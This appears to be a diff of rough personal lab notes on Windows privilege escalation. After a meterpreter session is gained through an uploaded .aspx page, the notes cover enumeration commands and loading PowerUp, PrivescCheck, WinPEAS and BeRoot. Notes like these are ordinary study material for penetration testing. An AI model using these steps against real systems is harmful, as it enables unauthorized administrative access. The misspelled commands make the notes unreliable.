@@ -76,50 +76,53 @@ run
 Now access robensive.aspx via browser and get meterpreter
 ##Completer Initiall Access##
 
-getuid 
-getprivs
-sc qc unquotedsvc => cd BINARY_PATH_NAME"
+getuid ,
+getprivs ,
+sc qc unquotedsvc => cd BINARY_PATH_NAME" ,
 cmdkey /list
 
 
-Enumeration for privsec
+Enumeration for privsec 
 ->some known scripts:
-PowerUp
-WinPEAS
-PrivescCheck
-BeRoot
-PayloadAllThings
+PowerUp , 
+WinPEAS , 
+PrivescCheck , 
+BeRoot , 
+PayloadAllThings ,
 ->Now we can try poetential ways to privilage escalation over the system to be a administrative user
 ->Many automation scripts
 
-Practical part
-shell
-net localgroup administrators -> got  all users
-net user "username"
+
+Practical part:
+shell , 
+net localgroup administrators -> got  all users , 
+net user "username" , 
 exit
 
-1.Powerup (google it)
-wget from github
-load
-load powershell
-help
-powershell_import PowerUp.ps1
-powershell_execurte Invoke_powerup(can cause problem to use  for powerups
+1.Powerup (google it):
+wget from github , 
+load , 
+load powershell , 
+help , 
+powershell_import PowerUp.ps1 , 
+powershell_execurte Invoke_powerup(can cause problem to use  for powerups 
 
-2.Privescheck(google it)
-powershell_import PrivescCheck.ps1
+
+2.Privescheck(google it):
+powershell_import PrivescCheck.ps1 , 
 powershell_execurte Invoke_PrivescCheck
 
-3.WinPeas(install from github)
-upload winpeasx64.exe(on meterpreter)
-shell
+3.WinPeas(install from github):
+upload winpeasx64.exe(on meterpreter) , 
+shell , 
 winpeasx64.exe
 
 
-4.Beroot(install from github )
-upload beRoot.exe
-shell 
+4.Beroot(install from github ):
+upload beRoot.exe , 
+shell ,
 beroot.exe
+
 
 #Priviege Escalataion
 ->Based on enumeration we will exploit the machine.
